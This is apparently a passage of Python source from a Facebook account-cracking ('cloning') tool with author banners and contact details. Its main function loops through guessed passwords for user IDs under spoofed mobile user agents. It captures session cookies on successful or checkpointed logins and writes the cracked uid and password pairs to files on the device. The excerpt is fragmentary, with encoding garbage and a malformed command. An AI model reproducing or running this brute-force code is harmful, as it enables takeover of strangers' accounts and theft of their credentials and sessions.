...
â•‘ Creator  : MD NASIM MIA                       â•‘
â•‘ Github   : https://github.com/Nasimblog  â•‘
â•‘ Facebook : MD Nasim Mia                           â•‘
...
def my_tool_security():
    ...
    print(47*"-")
    print(c, 45*"-",)
    print("\t  Facebook : MD Nasim Mia ")
    print("\t  Fb page  : NASIM COMMUNITY ")
    print("\t  Github   : Nasimblog")
    print(c, 45*"-")
    print(47*"-")
    try:
    ...
    my_server=requests.get("https://youtube.com/@namedesign7592").text
...
┌────────────────────────────────────────────────┐
│➣ ➤𖣘𝐀𝐔𝐓𝐇𝐎𝐑𖣘➤  :➤༺𝐍𝐀𝐒𝐈𝐌༻
│➣➤𖣘𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊𖣘➤:➤𝐌D 𝐍𝐀𝐒𝐈𝐌 𝐌𝐈𝐀༻
│➣ ➤𖣘𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐒𖣘➤:➤𝟎𝟏𝟕𝟔𝟖𝟓𝟕𝟔𝟗𝟏𝟖༻
│➣ ➤𖣘𝐘𝐎𝐔𝐓𝐔𝐁𝐄𖣘➤ :➤𝐂𝐘𝐁𝐄𝐑➤༻
└────────────────────────────────────────────────┘
➤𖣘𝐆𝐑𝐎𝐔𝐏𖣘➤➤─🌺🌀𝐂𝐘𝐁𝐄𝐑_TEAM_🌀➤─🌺─➤ """)  🖤────😈{ 𝐍𝐀𝐒𝐈𝐌 }😈────🖤                                         
...
def password():
    ...
    if passX in ['1','01']:
        ...
        os.system("xdg-openhttps://www.facebook.com/mdnasimmia44")
        password6()
    else:
        xyz()
#---------------------[CLONING MAIN DEF]---------------------#
...
def free1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            bi = random.choice([A])
            session = requests.Session()
            sys.stdout.write(f'\r\33[1;37m[NASIM ðŸ”¥] [%s] \33[1;97m[OK:%s{SRABON}CP:%s]'%(loop,len(ok),len(cp))), 
            sys.stdout.flush()
            pro = random.choice(ugen)
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = coki[7:22]
                print('\r\033[1;32m[NASIM-OK] '+uid+' [âˆš] '+ps+ '')
                cek_apk(session,coki)
                open('/sdcard/NASIM-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
            elif 'checkpoint' in log_cookies:
                if 'Enter login code to continue' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    ...
                    uid=coki[24:39]
                    Red = '\033[1;31m'
                    print(f'\r\033[1;35m[NASIM-CP] '+uid+' [Ã—] '+ps+ ' ')
                    open('/sdcard/NASIM-CP.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
            ...
            if 'c_user' in log_cookies:
                ...
                if 'Enter login code to continue' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    print('\r\033[1;34m[NASIM] '+uid+' [~] '+ps+' ')
                    open('/sdcard/NASIM.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
